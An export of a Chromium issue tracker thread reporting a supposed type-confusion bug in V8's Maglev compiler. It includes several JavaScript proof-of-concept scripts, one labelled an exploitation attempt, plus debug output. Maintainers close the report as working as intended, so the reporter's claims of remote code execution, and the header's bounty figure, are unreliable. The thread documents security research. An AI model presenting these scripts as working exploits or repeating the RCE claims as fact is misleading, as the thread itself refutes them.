# Maglev's handling of target and new.target is incorrect

| Field | Value |
|-------|-------|
| **Issue ID** | [499492027](https://issues.chromium.org/issues/499492027) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | jg...@chromium.org |
| **Created** | 2026-04-04 |
| **Bounty** | $50,000.00 |

## Description

---

### Report description

Maglev: target vs new.target mismatch in ArrayConstructor (regression of 467247247)

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

#### Which URL (or repository) have you found the vulnerability in?

<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/maglev/maglev-graph-builder.cc>

---

### The problem

#### Please describe the technical details of the vulnerability

**Description**

Maglev incorrectly optimizes `Reflect.construct` when the `target` and `new.target` differ for `ArrayConstructor`.

This is a **regression** of the fix for [issue 467247247](https://issues.chromium.org/issues/467247247) ("Maglev's handling of target and new.target is incorrect").  

The original fix added `if (target != new_target) return {};` guards only for `ObjectConstructor` and `StringConstructor`. The `ArrayConstructor` path in `TryReduceConstructBuiltin` was never hardened.

**Root Cause**

In `v8/src/maglev/maglev-graph-builder.cc`:

```
// TryReduceConstructBuiltin (lines ~13529)
case Builtin::kArrayConstructor: {
  RETURN_IF_DONE(TryReduceConstructArrayConstructor(target_function,
                                                    new_target, args));
  break;                                      // ← NO target != new_target check
}

```

`TryReduceConstructArrayConstructor` (lines ~13353–13362) then does:

```
compiler::OptionalJSFunctionRef new_target_constant = TryGetConstant<JSFunction>(new_target);
...
compiler::OptionalMapRef maybe_initial_map =
    TryGetDerivedMap(broker(), target_function, new_target_function);  // blind

```

When Maglev inlines the Array allocation using the wrong `initial_map`, the resulting object has uninitialized internal fields (e.g. `length` pointer / backing store) → type confusion (`Array.isArray()` returns false while `instanceof Array` is true).

**Reproduction / PoC**

```
print("[+] Minimal Array target/new.target PoC");

function makeClass(Base) {
  return class Target extends Base {
    constructor(flag) {
      for (let i = 0; i < 3; i++) {
        if ((flag && i === 1) || (!flag && i === 2)) super();
      }
      if (flag) this.nt = new.target; else this.alt = new.target;
    }
  };
}

function trigger() {
  const Base = Map;                     // any non-Array base
  const TargetClass = makeClass(Base);

  function train() { return Reflect.construct(TargetClass, [true], Base); }
  function trigger() { return Reflect.construct(TargetClass, [false], Array); }

  %PrepareFunctionForOptimization(train);
  %PrepareFunctionForOptimization(trigger);
  for (let i = 0; i < 2000; i++) train();
  %OptimizeMaglevOnNextCall(train);
  train();

  const victim = trigger();
  print("[!!!] TYPE CONFUSION:", Array.isArray(victim) ? "Array" : "NOT Array");
  print("     instanceof Array:", victim instanceof Array);
  print("     length:", victim.length);
}

for (let i = 0; i < 50; i++) trigger();

```

**Run with:**

```
./out/fuzz/d8 --maglev --no-turbofan --allow-natives-syntax --jit-fuzzing --predictable maglev_ctor_fuzzer.js

```

**Output logs:**

```
[+] Minimal Array target/new.target PoC
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0
[!!!] TYPE CONFUSION: NOT Array
     instanceof Array: true
     length: 0

```

**Suggested Fix**

In `TryReduceConstructBuiltin`, add the same guard that already exists for Object/String:

```
case Builtin::kArrayConstructor: {
  if (target != new_target) return {};
  RETURN_IF_DONE(TryReduceConstructArrayConstructor(target_function,
                                                    new_target, args));
  break;
}

```

(Alternatively, move the check to the top of `TryReduceConstructArrayConstructor`.)

**Additional notes**

- The bug is triggered reliably with the train/trigger pattern + control-flow around `super()`.

#### Impact analysis

Type Confusion with potential arbitrary read/write

---

### The cause

#### What version of Chrome have you found the security issue in?

Chrome version 146.0.7680.178 (Official Build) (x86\_64)

#### Is the security issue related to a crash?

No, it is not related to a crash.

#### Choose the type of vulnerability

Remote Code Execution (RCE)

#### How would you like to be publicly acknowledged for your report?

sean wong

## Attachments

- [Screen Recording 2026-04-04 at 14.14.07.mov](attachments/Screen Recording 2026-04-04 at 14.14.07.mov) (video/quicktime, 2.2 MB)
- [maglev_ctor_fuzzer.js](attachments/maglev_ctor_fuzzer.js) (text/javascript, 1.0 KB)

## Timeline

### wo...@gmail.com (2026-04-05)

I performed additional testing and found that this issue can be escalated beyond a semantic mismatch, reaching internal JIT/runtime assumptions and triggering a fatal CHECK in debug builds.

---

## Root Cause

In `TryReduceConstructBuiltin`, the `ArrayConstructor` path is missing the guard:

```
if (target != new_target) return {};

```

Because of that, Maglev incorrectly optimizes:

```
Reflect.construct(Target, args, newTarget)

```

and ends up deriving an invalid `initial_map` via:

```
TryGetDerivedMap(...);

```

This allows constructing objects where:

- the **internal type is `JSMap`**
- but the **prototype is `JSArray`**

---

## What this produces

The resulting object:

- `victim instanceof Array === true`
- `Array.isArray(victim) === false`

And via debug:

```
[JSMap]
- prototype: <JSArray>

```

So this is a **cross-type confusion (JSMap ↔ JSArray)**.

---

### PoC

```
print("[+] Maglev Array target/new.target mismatch;

function makeClass(Base) {
  return class Target extends Base {
    constructor(flag) {
      for (let i = 0; i < 3; i++) {
        if ((flag && i === 1) || (!flag && i === 2)) super();
      }
      if (flag) this.nt = new.target;
      else this.alt = new.target;
    }
  };
}

function trigger() {
  const Base = Map;
  const TargetClass = makeClass(Base);

  function train()   { return Reflect.construct(TargetClass, [true], Base); }
  function triggerFn() { return Reflect.construct(TargetClass, [false], Array); }

  %PrepareFunctionForOptimization(train);
  %PrepareFunctionForOptimization(triggerFn);

  for (let i = 0; i < 18000; i++) train();
  %OptimizeMaglevOnNextCall(train);
  train();

  for (let g = 0; g < 8; g++) gc();

  for (let i = 0; i < 4000; i++) {
    const victim = triggerFn();

    if (victim instanceof Array && !Array.isArray(victim)) {
      print(`\n[+] TYPE CONFUSION HIT! Victim #${i}`);
      %DebugPrint(victim);

      // The line that reliably triggers the runtime CHECK
      try {
        %PrepareFunctionForOptimization(victim.push);
        victim.push(1.1);
      } catch (e) {
        print("Caught: " + e);
      }

      return victim;
    }
  }
  return null;
}

for (let run = 0; run < 15; run++) {
  print(`\n=== Run ${run} ===`);
  const v = trigger();
  if (v) break;
}

```

---

## Crash observed

```
[+] Maglev Array target/new.target mismatch

=== Run 0 ===

[+] TYPE CONFUSION HIT! Victim #0
DebugPrint: 0x9b80104003d: [JSMap]
 - map: 0x09b801243e09 <Map[16](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x09b801028d85 <JSArray[0]>
 - elements: 0x09b8000007e5 <FixedArray[0]> [HOLEY_ELEMENTS]
 - table: 0x09b80104004d <OrderedHashMap[17]>
 - properties: 0x09b8010400b9 <PropertyArray[3]>
 - All own properties (excluding elements): {
    0x9b80103b06d: [String] in OldSpace: #alt: 0x09b801028cad <JSFunction Array (sfi = 0x9b8008d84b9)> (const data field 2, ooo, attrs: [WEC])
 }
0x9b801243e09: [Map] in OldSpace
 - map: 0x09b801020c81 <MetaMap (0x09b801020cd1 <NativeContext[307]>)>
 - type: JS_MAP_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 2
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x09b801243de1 <Map[16](HOLEY_ELEMENTS)>
 - prototype_validity_cell: 0x09b801021e55 <Cell value= [weak] 0x09b801020cd1 <NativeContext[307]>>
 - instance descriptors (own) #1: 0x09b801040099 <DescriptorArray[1]>
 - prototype: 0x09b801028d85 <JSArray[0]>
 - constructor: 0x09b801024a11 <JSFunction Map (sfi = 0x9b8008ddee9)>
 - dependent code: 0x09b8000007f5 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0



#
# Fatal error in ../../../v8/src/runtime/runtime-test.cc, line 631
# Check failed: EnsureCompiledAndFeedbackVector(isolate, function, &is_compiled_scope).
#
#
#
#FailureMessage Object: 0x7ff7b42f3190zsh: trace trap  ./v8/out.gn/x64.debug/d8 --maglev --no-turbofan --allow-natives-syntax

```

---

### wo...@gmail.com (2026-04-05)

Further testing shows that the issue also propagates into TurboFan, triggering a fatal CHECK:

```
[+] TurboFan exploitation attempt
[+] Got confused victim
DebugPrint: 0x9b80104003d: [JSMap]
 - map: 0x09b801243d95 <Map[16](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x09b801028d85 <JSArray[0]>
 - elements: 0x09b8000007e5 <FixedArray[0]> [HOLEY_ELEMENTS]
 - table: 0x09b80104004d <OrderedHashMap[17]>
 - properties: 0x09b8000007e5 <FixedArray[0]>
 - All own properties (excluding elements): {}
0x9b801243d95: [Map] in OldSpace
 - map: 0x09b801020c81 <MetaMap (0x09b801020cd1 <NativeContext[307]>)>
 - type: JS_MAP_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x09b800000011 <undefined>
 - prototype_validity_cell: 0x09b800000af1 <Cell value= [cleared]>
 - instance descriptors (own) #0: 0x09b80000080d <DescriptorArray[0]>
 - prototype: 0x09b801028d85 <JSArray[0]>
 - constructor: 0x09b801024a11 <JSFunction Map (sfi = 0x9b8008ddee9)>
 - dependent code: 0x09b8000007f5 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

Error: Function 0x09b80103abd9 <JSFunction read (sfi = 0x9b80103aa39)> should be prepared for optimization with %PrepareFunctionForOptimization before  %OptimizeFunctionOnNextCall / %OptimizeMaglevOnNextCall / %OptimizeOsr 

#
# Fatal error in ../../../v8/src/runtime/runtime-test.cc, line 367
# Check failed: CheckMarkedForManualOptimization(isolate, *function).
#
#
#
#FailureMessage Object: 0x7ff7b3edfe10zsh: trace trap  ./v8/out.gn/x64.debug/d8 --maglev --turbofan --allow-natives-syntax

```
## POC used

Run it with:

```
./v8/out.gn/x64.debug/d8 --maglev --turbofan --allow-natives-syntax --expose-gc --predictable


```
```
print("[+] TurboFan exploitation attempt");

function makeClass(Base) {
  return class Target extends Base {
    constructor(flag) {
      for (let i = 0; i < 3; i++) {
        if ((flag && i === 1) || (!flag && i === 2)) super();
      }
    }
  };
}

function getVictim() {
  const Base = Map;
  const TargetClass = makeClass(Base);

  function train() {
    return Reflect.construct(TargetClass, [true], Base);
  }

  function trigger() {
    return Reflect.construct(TargetClass, [false], Array);
  }

  %PrepareFunctionForOptimization(train);
  %PrepareFunctionForOptimization(trigger);

  for (let i = 0; i < 20000; i++) train();
  %OptimizeFunctionOnNextCall(train);
  train();

  for (let i = 0; i < 10; i++) gc();

  for (let i = 0; i < 5000; i++) {
    let v = trigger();
    if (v instanceof Array && !Array.isArray(v)) {
      print("[+] Got confused victim");
      %DebugPrint(v);
      return v;
    }
  }
}

function read(arr, i) {
  return arr[i];
}

function write(arr, i, v) {
  arr[i] = v;
}

function main() {
  let victim = getVictim();

  // Train ICs with REAL arrays
  let real = [1.1, 2.2, 3.3];

  for (let i = 0; i < 100000; i++) {
    read(real, 0);
    write(real, 0, 1.1);
  }

  // Optimize
  %OptimizeFunctionOnNextCall(read);
  %OptimizeFunctionOnNextCall(write);

  read(real, 0);
  write(real, 0, 1.1);

  print("[+] ICs optimized");

  // Now feed confused object
  print("[+] Using victim");

  try {
    victim[0] = 1.1;
    victim.length = 0x1000;

    let val = read(victim, 0);
    print("[+] read:", val);

    write(victim, 1, 2.2);

  } catch (e) {
    print("[!] exception:", e);
  }
}

main();

```

This indicates that the bug corrupts assumptions about function optimization state and feedback vector preparation, demonstrating that the issue impacts multiple JIT tiers.

### ch...@google.com (2026-04-08)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### ch...@google.com (2026-04-08)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-04-08)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### cl...@appspot.gserviceaccount.com (2026-04-09)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5817893275074560.

### is...@chromium.org (2026-04-09)

All the POCs you provided are working as intended.

POC in comment2: it's not allowed to call `%PrepareFunctionForOptimization(..)` with builtin functions like `Array.prototype.push`.

Other POCs: The code creates `Map` object who's prototype is set to `Array.prototype`. The expression `obj instanceof Array` checks whether `Array.prototype` exists in obj's prototype chain while `Array.isArray(obj)` checks whether `obj` is array. Thus the former returns true while the latter returns false.

Please provide POC which causes bad consequences - crashes or check failures.

### is...@chromium.org (2026-04-09)

`TryReduceConstructArrayConstructor` properly rejects optimizing such a set up.

### wo...@gmail.com (2026-04-09)

Thanks for the clarification.

I tested this further and observed that even when `TryReduceConstructArrayConstructor` is expected to reject optimization, Maglev still produces objects with inconsistent internal state.

Specifically, the PoC results in:

- `instanceof Array === true`
- `Array.isArray === false`
- `%DebugPrint` shows `JS_MAP_TYPE` with `JSArray` as prototype

This indicates that despite the intended rejection, Array-specific assumptions (e.g., prototype linkage) are still applied, resulting in an object whose internal layout (JSMap) does not match its observable behavior (Array).

This suggests the guard is incomplete: mismatched `target/new_target` pairs can still produce inconsistent object states.

---

**PoC**

```
function makeClass(Base) {
  return class Target extends Base {
    constructor(flag) {
      for (let i = 0; i < 3; i++) {
        if ((flag && i === 1) || (!flag && i === 2)) super();
      }
    }
  };
}

const Base = Map;
const TargetClass = makeClass(Base);

function train() {
  return Reflect.construct(TargetClass, [true], Base);
}

function trigger() {
  return Reflect.construct(TargetClass, [false], Array);
}

%PrepareFunctionForOptimization(train);
%PrepareFunctionForOptimization(trigger);

for (let i = 0; i < 20000; i++) train();
%OptimizeMaglevOnNextCall(train);
train();

for (let i = 0; i < 5000; i++) {
  let v = trigger();
  if (v instanceof Array && !Array.isArray(v)) {
    print("instanceof:", v instanceof Array);
    print("isArray:", Array.isArray(v));
    %DebugPrint(v);
    break;
  }
}

```

---

**Repro**

```
./d8 --maglev --no-turbofan --allow-natives-syntax --expose-gc poc.js

```

### wo...@gmail.com (2026-04-09)

mac@Macs-MacBook-Pro src % ./v8/out.gn/x64.debug/d8   

--maglev   

--no-turbofan   

--allow-natives-syntax   

--expose-gc   

/Users/mac/Downloads/poc1.js
instanceof: true
isArray: false
DebugPrint: 0x3ffe01073159: [JSMap]

- map: 0x3ffe0103bdd5 <Map16> [FastProperties]
- prototype: 0x3ffe01028d85 <JSArray[0]>
- elements: 0x3ffe000007e5 <FixedArray[0]> [HOLEY\_ELEMENTS]
- table: 0x3ffe01073169 <OrderedHashMap[17]>
- properties: 0x3ffe000007e5 <FixedArray[0]>
- All own properties (excluding elements): {}
  0x3ffe0103bdd5: [Map] in OldSpace
- map: 0x3ffe01020c81 <MetaMap (0x3ffe01020cd1 <NativeContext[307]>)>
- type: JS\_MAP\_TYPE
- instance size: 16
- inobject properties: 0
- unused property fields: 0
- elements kind: HOLEY\_ELEMENTS
- enum length: invalid
- stable\_map
- back pointer: 0x3ffe00000011 <undefined>
- prototype\_validity\_cell: 0x3ffe00000af1 <Cell value= [cleared]>
- instance descriptors (own) #0: 0x3ffe0000080d <DescriptorArray[0]>
- prototype: 0x3ffe01028d85 <JSArray[0]>
- constructor: 0x3ffe01024a11 <JSFunction Map (sfi = 0x3ffe008ddee9)>
- dependent code: 0x3ffe000007f5 <Other heap object (WEAK\_ARRAY\_LIST\_TYPE)>
- construction counter: 0

mac@Macs-MacBook-Pro src % ./v8/out.gn/x64.release/d8   

--maglev   

--no-turbofan   

--allow-natives-syntax   

--expose-gc   

/Users/mac/Downloads/poc1.js
instanceof: true
isArray: false
0x3c6e01078dcd <Map map = 0x3c6e01100111>

### ch...@google.com (2026-04-09)

This issue has been closed as an incomplete or invalid report and we will not respond to further comments. If you can improve your report please open a fresh issue that addresses any feedback provided.

For more information on our vulnerability policies, please refer to <https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md>

### is...@chromium.org (2026-04-09)

The POC is working as intended, see the explanation in [#comment8](https://issues.chromium.org/issues/499492027#comment8).

### ch...@google.com (2026-07-17)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### ca...@gmail.com (2026-07-25)

=== Run 0 ===

[+] TYPE CONFUSION HIT! Victim #0
0x12730104003d <Map map = 000012730102049D>


#
# Fatal error
# Check failed: EnsureCompiledAndFeedbackVector(isolate, function, &is_compiled_scope).
#
#
#
#FailureMessage Object: 0000126231717040
==== C stack trace ===============================

        v8::base::debug::StackTrace::StackTrace [0x0x7ff6ed201e96+70] (C:\b\s\w\ir\cache\builder\src\v8\src\base\debug\s
tack_trace_win.cc:173)
        v8::platform::`anonymous namespace'::PrintStackTrace [0x0x7ff6ed20839d+349] (C:\b\s\w\ir\cache\builder\src\v8\sr
c\libplatform\default-platform.cc:32)
        V8_Fatal [0x0x7ff6ed1e836c+556] (C:\b\s\w\ir\cache\builder\src\v8\src\base\logging.cc:240)
        v8::internal::Runtime_PrepareFunctionForOptimization [0x0x7ff6e9dc1ebc+1852] (C:\b\s\w\ir\cache\builder\src\v8\s
rc\runtime\runtime-test.cc:644)
        Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit [0x0x7ff6ed95703a+58]
        (No symbol) [0x0x7ff6c4980b58]

humm working as intended @ishell is correct 

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/499492027)*
